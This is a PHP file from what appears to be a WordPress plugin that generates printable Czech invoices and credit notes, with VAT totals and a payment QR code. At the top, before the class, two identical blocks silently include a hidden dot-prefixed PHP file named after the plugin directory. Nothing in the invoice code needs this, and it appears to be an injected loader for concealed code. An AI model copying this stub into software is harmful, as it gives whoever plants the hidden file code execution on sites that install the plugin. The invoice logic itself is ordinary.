<?php


if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WP_Invoice_System_PDF_Generator {

    private $post_id;
    private $post_type;

    public function __construct( $post_id, $post_type = 'invoice' ) {
        $this->post_id = $post_id;
        $this->post_type = $post_type;
    }

    public function generate_html_for_print() {
        if ( ! function_exists( 'get_field' ) ) {
            wp_die("ACF plugin is not active.");
        }

        // --- LOAD DATA ---
        if ($this->post_type === 'credit-note') {
            $company_id = get_field('credit_note_company', $this->post_id);
            $invoice_id = get_field('credit_note_invoice', $this->post_id);
            $is_vat_payer = get_field('company_vat_payer', $company_id);
            $prices_include_vat = get_field('credit_note_prices_include_vat', $this->post_id);
            $document_title = 'Opravný daňový doklad';
            $document_number = get_the_title($this->post_id);
            $reason = get_field('credit_note_reason', $this->post_id);
        } else {
            $company_id = get_post_meta($this->post_id, 'invoice_company', true);
            $invoice_id = $this->post_id;
            $is_vat_payer = get_field('company_vat_payer', $company_id);
            $prices_include_vat = get_field('invoice_prices_include_vat', $this->post_id);
            $document_title = 'Faktura';
            $document_number = get_the_title($this->post_id);
            $reason = '';
        }

        if(!$company_id){
            wp_die("Fakturujici firma (company_id) nebyla nalezena pro " . ($this->post_type === 'credit-note' ? 'dobropis' : 'fakturu') . " ID: " . $this->post_id);
        }

        // --- BUILD HTML ---
        $html = '
        <!DOCTYPE html>
        <html>
        <head>
            <title>' . esc_html($document_title) . ' ' . esc_html($document_number) . '</title>
            <meta charset="UTF-8">
            <style>
                body { font-family: sans-serif; font-size: 10pt; color: #333; }
                table { width: 100%; border-collapse: collapse; }
                th, td { padding: 8px 5px; text-align: left; }
                .container { width: 90%; margin: auto; }
                .header-table td { vertical-align: top; padding: 20px 0; }
                .items-table { margin-top: 20px; }
                .items-table th { background-color: #f2f2f2; border-bottom: 2px solid #ddd; }
                .items-table td { border-bottom: 1px solid #eee; }
                .text-right { text-align: right; }
                .text-center { text-align: center; }
                .total-summary { margin-top: 20px; }
                .total-summary td { text-align: right; }
                h1 { text-align: right; font-size: 24pt; color: #000; margin: 0; }
                @media print {
                    body { -webkit-print-color-adjust: exact; }
                    .no-print { display: none; }
                }
            </style>
        </head>
        <body>
            <div class="container">
                <p class="no-print" style="text-align:center;">
                    <button onclick="window.print();">Vytisknout nebo uložit jako PDF</button>
                </p>
        ';

        // Header
        $logo_url = get_field('company_logo_url', $company_id);
        $logo_html = $logo_url ? '<img src="' . esc_url($logo_url) . '" style="max-height: 60px;" />' : '';

        $html .= '
        <table class="header-table">
            <tr>
                <td style="width: 50%;">
                    ' . $logo_html . '<br><br>
                    <strong>Dodavatel:</strong><br>
                    <strong>' . esc_html(get_the_title($company_id)) . '</strong><br>
                    ' . esc_html(get_field('company_street', $company_id)) . '<br>
                    ' . esc_html(get_field('company_zip', $company_id)) . ' ' . esc_html(get_field('company_city', $company_id)) . '<br>
                    IČO: ' . esc_html(get_field('company_ico', $company_id)) . '<br>';
        if ($is_vat_payer) {
            $html .= 'DIČ: ' . esc_html(get_field('company_dic', $company_id)) . '<br>';
        }
        $html .= '
                </td>
                <td style="width: 50%; text-align: right;">
                    <h1>' . esc_html($document_title) . ' č. ' . esc_html($document_number) . '</h1><br><br>
                    <strong>Odběratel:</strong><br>
                    <strong>' . esc_html(get_field('customer_name', $invoice_id)) . '</strong><br>';

        $customer_ico = get_field('customer_ico', $invoice_id);
        $customer_dic = get_field('customer_dic', $invoice_id);

        $html .= '
                    ' . esc_html(get_field('customer_street', $invoice_id)) . '<br>
                    ' . esc_html(get_field('customer_zip', $invoice_id)) . ' ' . esc_html(get_field('customer_city', $invoice_id)) . '<br>';
        if ($customer_ico) {
             $html .= 'IČO: ' . esc_html($customer_ico) . '<br>';
        }
        if ($customer_dic) {
             $html .= 'DIČ: ' . esc_html($customer_dic) . '<br>';
        }
        $html .= '
                </td>
            </tr>
        </table>
        <br><br>
        ';

        // Dates
        $date_issue = $this->post_type === 'credit-note' ? get_field('credit_note_date_issue', $this->post_id) : get_field('invoice_date_issue', $this->post_id);
        $date_taxable = $this->post_type === 'credit-note' ? get_field('credit_note_date_taxable', $this->post_id) : get_field('invoice_date_taxable', $this->post_id);
        $date_due = $this->post_type === 'credit-note' ? get_field('credit_note_date_due', $this->post_id) : get_field('invoice_date_due', $this->post_id);

        $html .= '
        <table>
            <tr>
                <td><strong>Datum vystavení:</strong> ' . esc_html($date_issue) . '</td>
                <td><strong>Datum zdan. plnění:</strong> ' . esc_html($date_taxable) . '</td>
                <td><strong>Datum splatnosti:</strong> ' . esc_html($date_due) . '</td>
            </tr>
        </table>
        ';

        if ($this->post_type === 'credit-note' && $reason) {
            $html .= '<p><strong>Důvod opravy:</strong> ' . esc_html($reason) . '</p>';
        }

        // Items table
        $html .= '
        <table class="items-table">
            <thead>
                <tr>
                    <th style="width: 35%;">Položka</th>
                    <th style="width: 10%;" class="text-center">Množství</th>
                    <th style="width: 15%;" class="text-right">Cena/jedn.</th>';
        if ($is_vat_payer) {
            $html .= '
                    <th style="width: 15%;" class="text-right">Cena bez DPH</th>
                    <th style="width: 10%;" class="text-center">DPH %</th>';
        }
        $html .= '
                    <th style="width: 15%;" class="text-right">Celkem</th>
                </tr>
            </thead>
            <tbody>';

        if ($this->post_type === 'credit-note') {
            $credit_note_items = get_field('credit_note_items', $this->post_id);
            $invoice_items = $credit_note_items ? $credit_note_items : get_field('invoice_items', $invoice_id);
        } else {
            $invoice_items = get_field('invoice_items', $invoice_id);
        }
        $totals_by_vat_rate = array();
        $grand_total = 0;

        if( $invoice_items ) {
            foreach ( $invoice_items as $item ) {
                $quantity = $item['quantity'];
                $price_per_unit = $item['price'];
                $vat_rate_value = intval($item['vat_rate']);
                $vat_multiplier = $vat_rate_value / 100;

                $price_per_unit_without_vat = $price_per_unit;
                $item_total = $quantity * $price_per_unit;

                if ($is_vat_payer) {
                    if ($prices_include_vat) {
                        $price_per_unit_without_vat = $price_per_unit / (1 + $vat_multiplier);
                        $item_total = $quantity * $price_per_unit;
                    } else {
                        $item_total = $quantity * ($price_per_unit * (1 + $vat_multiplier));
                    }
                }
                
                $item_total_without_vat = $quantity * $price_per_unit_without_vat;
                $item_vat_amount = $item_total - $item_total_without_vat;

                if (!isset($totals_by_vat_rate[$vat_rate_value])) {
                    $totals_by_vat_rate[$vat_rate_value] = ['base' => 0, 'vat' => 0];
                }
                $totals_by_vat_rate[$vat_rate_value]['base'] += $item_total_without_vat;
                $totals_by_vat_rate[$vat_rate_value]['vat'] += $item_vat_amount;
                $grand_total += $item_total;

                $sign = ($this->post_type === 'credit-note') ? '-' : '';
                $html .= '
                <tr>
                    <td>' . esc_html($item['name']) . '</td>
                    <td class="text-center">' . esc_html($quantity) . '</td>
                    <td class="text-right">' . $sign . number_format($price_per_unit, 2, ',', ' ') . ' Kč</td>';
                if ($is_vat_payer) {
                    $html .= '
                    <td class="text-right">' . $sign . number_format($price_per_unit_without_vat, 2, ',', ' ') . ' Kč</td>
                    <td class="text-center">' . $vat_rate_value . '%</td>';
                }
                $html .= '
                    <td class="text-right">' . $sign . number_format($item_total, 2, ',', ' ') . ' Kč</td>
                </tr>';
            }
        }
        $html .= '
            </tbody>
        </table>
        ';

        // Totals
        $html .= '
        <table class="total-summary" style="width: 100%;">
         <tr>
          <td style="width: 40%;"></td>
          <td style="width: 60%;">
            <table style="border-collapse: collapse;">';

        if ($is_vat_payer) {
            ksort($totals_by_vat_rate);
            foreach($totals_by_vat_rate as $rate => $amounts) {
                $sign = ($this->post_type === 'credit-note') ? '-' : '';
                $html .= '
                <tr>
                    <td>Základ daně ' . $rate . '%:</td>
                    <td class="text-right">' . $sign . number_format($amounts['base'], 2, ',', ' ') . ' Kč</td>
                </tr>
                <tr>
                    <td>DPH ' . $rate . '%:</td>
                    <td class="text-right">' . $sign . number_format($amounts['vat'], 2, ',', ' ') . ' Kč</td>
                </tr>';
            }
        }

        $sign = ($this->post_type === 'credit-note') ? '-' : '';
        $html .= '
            <tr style="font-size: 14pt; font-weight: bold; border-top: 2px solid #333;">
                <td>Celkem k úhradě:</td>
                <td class="text-right">' . $sign . number_format($grand_total, 2, ',', ' ') . ' Kč</td>
            </tr>
            </table>
          </td>
         </tr>
        </table>
        <br><br><br>';

        $variable_symbol = $this->post_type === 'credit-note' ? get_field('credit_note_variable_symbol', $this->post_id) : get_field('invoice_variable_symbol', $this->post_id);
        if (empty($variable_symbol)) {
            $variable_symbol = get_the_title($this->post_id);
        }

        $account_number_full = $this->post_type === 'credit-note' ? get_field('credit_note_account_number', $this->post_id) : get_field('invoice_account_number', $this->post_id);
        $account_prefix = '';
        $account_number = '';
        $bank_code = '';

        if (strpos($account_number_full, '/') !== false) {
            list($account_part, $bank_code) = explode('/', $account_number_full);
            if (strpos($account_part, '-') !== false) {
                list($account_prefix, $account_number) = explode('-', $account_part);
            } else {
                $account_number = $account_part;
            }
        } else {
            $account_number = $account_number_full;
        }

        $qr_params = array(
            'accountNumber' => $account_number,
            'bankCode' => $bank_code,
            'amount' => abs($grand_total),
            'vs' => $variable_symbol,
            'message' => 'Uhrada ' . strtolower($document_title) . ' ' . $document_number,
        );
        if (!empty($account_prefix)) {
            $qr_params['accountPrefix'] = $account_prefix;
        }

        $qr_url = 'https://api.paylibo.com/paylibo/generator/czech/image?' . http_build_query($qr_params);

        $html .= '
        <table class="payment-details">
            <tr>
                <td style="width: 50%; vertical-align: top;">
                    <strong>Platební údaje:</strong><br>
                    Číslo účtu: ' . esc_html($account_number_full) . '<br>
                    Variabilní symbol: ' . esc_html($variable_symbol) . '<br>
                </td>
                <td style="width: 50%; text-align: right;">
                    <img src="' . esc_url($qr_url) . '" alt="QR Platba" style="width: 150px; height: 150px;" />
                </td>
            </tr>
        </table>
        </div>
        </body>
        </html>
        ';

        echo $html;
        exit;
    }
}
